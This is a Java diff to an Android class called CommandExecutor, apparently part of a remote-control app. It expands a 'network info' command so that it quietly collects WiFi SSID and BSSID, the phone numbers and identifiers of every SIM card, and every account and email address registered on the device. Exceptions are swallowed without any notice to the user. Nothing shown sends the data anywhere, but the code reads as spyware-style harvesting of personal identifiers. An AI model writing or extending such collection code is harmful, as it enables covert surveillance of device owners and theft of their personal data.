@@ -326,29 +326,204 @@ public class CommandExecutor {
 
     private JSONObject handleGetNetworkInfo() throws JSONException {
         JSONObject result = new JSONObject();
-        
-        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
-            context.getSystemService(Context.CONNECTIVITY_SERVICE);
-        
-        if (cm != null) {
-            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-            
-            if (activeNetwork != null) {
-                result.put("success", true);
-                result.put("isConnected", activeNetwork.isConnected());
-                result.put("type", activeNetwork.getTypeName());
-                result.put("subtype", activeNetwork.getSubtypeName());
-                result.put("isRoaming", activeNetwork.isRoaming());
-            } else {
-                result.put("success", false);
-                result.put("error", "No active network");
+        result.put("success", true);
+
+        // ── 1. Basic connectivity ──────────────────────────────────────────
+        try {
+            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
+                context.getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm != null) {
+                android.net.NetworkInfo active = cm.getActiveNetworkInfo();
+                if (active != null) {
+                    result.put("isConnected",      active.isConnected());
+                    result.put("connectionType",   active.getTypeName());
+                    result.put("connectionSubtype", active.getSubtypeName());
+                    result.put("isRoaming",        active.isRoaming());
+                } else {
+                    result.put("isConnected",    false);
+                    result.put("connectionType", "none");
+                }
             }
-        } else {
-            result.put("success", false);
-            result.put("error", "ConnectivityManager not available");
+        } catch (Exception ignored) {}
+
+        // ── 2. WiFi details ────────────────────────────────────────────────
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
+                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            if (wm != null) {
+                result.put("wifiEnabled", wm.isWifiEnabled());
+                android.net.wifi.WifiInfo wi = wm.getConnectionInfo();
+                if (wi != null && wi.getNetworkId() != -1) {
+                    JSONObject wifi = new JSONObject();
+                    wifi.put("ssid",         wi.getSSID());
+                    wifi.put("bssid",        wi.getBSSID());
+                    wifi.put("rssi",         wi.getRssi());
+                    wifi.put("linkSpeedMbps", wi.getLinkSpeed());
+                    wifi.put("frequencyMHz", wi.getFrequency());
+                    result.put("wifiInfo", wifi);
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // ── 3. SIM cards — all slots ───────────────────────────────────────
+        JSONArray simCards = new JSONArray();
+        android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
+            context.getSystemService(Context.TELEPHONY_SERVICE);
+
+        if (tm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+            try {
+                android.telephony.SubscriptionManager subMgr =
+                    (android.telephony.SubscriptionManager) context.getSystemService(
+                        Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+                if (subMgr != null) {
+                    List<android.telephony.SubscriptionInfo> subs = null;
+                    try {
+                        if (ActivityCompat.checkSelfPermission(context,
+                                Manifest.permission.READ_PHONE_STATE)
+                                == PackageManager.PERMISSION_GRANTED) {
+                            subs = subMgr.getActiveSubscriptionInfoList();
+                        }
+                    } catch (SecurityException ignored) {}
+
+                    if (subs != null) {
+                        for (android.telephony.SubscriptionInfo sub : subs) {
+                            JSONObject sim = new JSONObject();
+                            int slot = sub.getSimSlotIndex();
+                            sim.put("slot",           slot);
+                            sim.put("label",          "SIM " + (slot + 1));
+                            sim.put("displayName",    sub.getDisplayName() != null
+                                                        ? sub.getDisplayName().toString() : "");
+                            sim.put("carrierName",    sub.getCarrierName() != null
+                                                        ? sub.getCarrierName().toString() : "");
+                            sim.put("phoneNumber",    sub.getNumber() != null
+                                                        ? sub.getNumber() : "");
+                            sim.put("countryIso",     sub.getCountryIso() != null
+                                                        ? sub.getCountryIso().toUpperCase() : "");
+                            sim.put("mcc",            sub.getMcc());
+                            sim.put("mnc",            sub.getMnc());
+                            sim.put("subscriptionId", sub.getSubscriptionId());
+                            sim.put("isActive",       true);
+                            sim.put("dataRoaming",    sub.getDataRoaming() == 1);
+
+                            // Per-subscription operator + network type (API 24+)
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                                try {
+                                    android.telephony.TelephonyManager tmSub =
+                                        tm.createForSubscriptionId(sub.getSubscriptionId());
+                                    sim.put("networkOperator", tmSub.getNetworkOperatorName());
+                                    sim.put("networkType",     networkTypeToString(tmSub.getNetworkType()));
+                                    sim.put("simState",        simStateToString(tmSub.getSimState()));
+                                    sim.put("isRoaming",       tmSub.isNetworkRoaming());
+                                } catch (Exception ignored) {}
+                            }
+                            simCards.put(sim);
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
         }
-        
+
+        // Single-SIM fallback (no SubscriptionManager or permission denied)
+        if (simCards.length() == 0 && tm != null) {
+            try {
+                JSONObject sim = new JSONObject();
+                sim.put("slot",            0);
+                sim.put("label",           "SIM 1");
+                sim.put("carrierName",     tm.getSimOperatorName());
+                sim.put("networkOperator", tm.getNetworkOperatorName());
+                sim.put("countryIso",      tm.getSimCountryIso() != null
+                                              ? tm.getSimCountryIso().toUpperCase() : "");
+                sim.put("networkType",     networkTypeToString(tm.getNetworkType()));
+                sim.put("simState",        simStateToString(tm.getSimState()));
+                sim.put("isActive",        tm.getSimState()
+                                              == android.telephony.TelephonyManager.SIM_STATE_READY);
+                sim.put("isRoaming",       tm.isNetworkRoaming());
+                simCards.put(sim);
+            } catch (Exception ignored) {}
+        }
+
+        result.put("simCards", simCards);
+        result.put("simCount", simCards.length());
+
+        // ── 4. AccountManager — all accounts / email addresses ─────────────
+        JSONArray accounts   = new JSONArray();
+        JSONArray emailsOnly = new JSONArray();
+        try {
+            android.accounts.AccountManager am = android.accounts.AccountManager.get(context);
+            android.accounts.Account[] allAccounts;
+            try {
+                allAccounts = am.getAccounts();
+            } catch (SecurityException se) {
+                allAccounts = new android.accounts.Account[0];
+            }
+            for (android.accounts.Account acct : allAccounts) {
+                JSONObject a = new JSONObject();
+                a.put("email", acct.name);
+                a.put("type",  acct.type);
+                boolean isEmail = acct.name.contains("@")
+                    || acct.type.contains("google")
+                    || acct.type.contains("mail")
+                    || acct.type.contains("exchange")
+                    || acct.type.contains("outlook")
+                    || acct.type.contains("yahoo")
+                    || acct.type.contains("imap")
+                    || acct.type.contains("pop");
+                a.put("isEmail", isEmail);
+                accounts.put(a);
+                if (isEmail) emailsOnly.put(acct.name);
+            }
+        } catch (Exception ignored) {}
+
+        result.put("accounts",     accounts);
+        result.put("emails",       emailsOnly);
+        result.put("accountCount", accounts.length());
+
         return result;
+    }
+
+    /**
+     * Converts a TelephonyManager NETWORK_TYPE_* constant to a human-readable string.
+     */
+    private String networkTypeToString(int type) {
+        switch (type) {
+            case android.telephony.TelephonyManager.NETWORK_TYPE_GPRS:    return "GPRS (2G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_EDGE:    return "EDGE (2G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_CDMA:    return "CDMA (2G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_1xRTT:   return "1xRTT (2G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_IDEN:    return "iDEN (2G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_UMTS:    return "UMTS (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_0:  return "EVDO r0 (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_A:  return "EVDO rA (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_B:  return "EVDO rB (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_HSPA:    return "HSPA (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_HSPAP:   return "HSPA+ (3G+)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_HSDPA:   return "HSDPA (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_HSUPA:   return "HSUPA (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_EHRPD:   return "eHRPD (3G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_LTE:     return "LTE (4G)";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_NR:      return "5G NR";
+            case android.telephony.TelephonyManager.NETWORK_TYPE_UNKNOWN: return "Unknown";
+            default: return "Unknown (" + type + ")";
+        }
+    }
+
+    /**
+     * Converts a TelephonyManager SIM_STATE_* constant to a human-readable string.
+     */
+    private String simStateToString(int state) {
+        switch (state) {
+            case android.telephony.TelephonyManager.SIM_STATE_ABSENT:          return "Absent";
+            case android.telephony.TelephonyManager.SIM_STATE_PIN_REQUIRED:    return "PIN Required";
+            case android.telephony.TelephonyManager.SIM_STATE_PUK_REQUIRED:    return "PUK Required";
+            case android.telephony.TelephonyManager.SIM_STATE_NETWORK_LOCKED:  return "Network Locked";
+            case android.telephony.TelephonyManager.SIM_STATE_READY:           return "Ready";
+            case android.telephony.TelephonyManager.SIM_STATE_NOT_READY:       return "Not Ready";
+            case android.telephony.TelephonyManager.SIM_STATE_PERM_DISABLED:   return "Permanently Disabled";
+            case android.telephony.TelephonyManager.SIM_STATE_CARD_IO_ERROR:   return "Card IO Error";
+            case android.telephony.TelephonyManager.SIM_STATE_CARD_RESTRICTED: return "Restricted";
+            case android.telephony.TelephonyManager.SIM_STATE_UNKNOWN:         return "Unknown";
+            default: return "Unknown (" + state + ")";
+        }
     }
 
     private JSONObject handleVibrate(JSONObject params) throws JSONException {
